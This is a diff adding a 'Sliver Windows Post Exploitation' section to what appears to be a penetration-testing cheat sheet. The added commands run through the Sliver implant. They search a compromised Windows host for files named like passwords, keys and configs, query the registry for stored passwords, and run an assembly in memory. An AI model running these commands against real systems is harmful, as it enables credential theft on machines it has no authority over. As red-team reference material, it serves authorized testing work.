@@ -235,3 +235,30 @@ portfwd
 ```
 portfwd rm -i 2
 ```
+
+### Sliver Windows Post Exploitation
+
+* good finds&#x20;
+
+```
+execute -t 120 -o cmd.exe /c "dir c:\*pass* /s"
+execute -t 120 -o cmd.exe /c "dir c:\*password* /s"
+execute -t 120 -o cmd.exe /c "dir c:\*login* /s"
+execute -t 120 -o cmd.exe /c "dir c:\*.key /s"
+execute -t 120 -o cmd.exe /c "dir c:\*.ica /s"
+execute -t 120 -o cmd.exe /c "dir c:\*.pwd* /s"
+execute -t 120 -o cmd.exe /c "dir c:\*.config* /s"
+execute -t 120 -o cmd.exe /c "dir c:\*access* /s"
+```
+
+* passwords in the registry&#x20;
+
+```
+execute -o cmd.exe /c 'reg query HKCU /f password /t REG_SZ /s'
+```
+
+### Execute-Assembly
+
+```
+execute-assembly -t 80 /home/ubuntu/Downloads/Autoruns64.exe -accepteula
+```
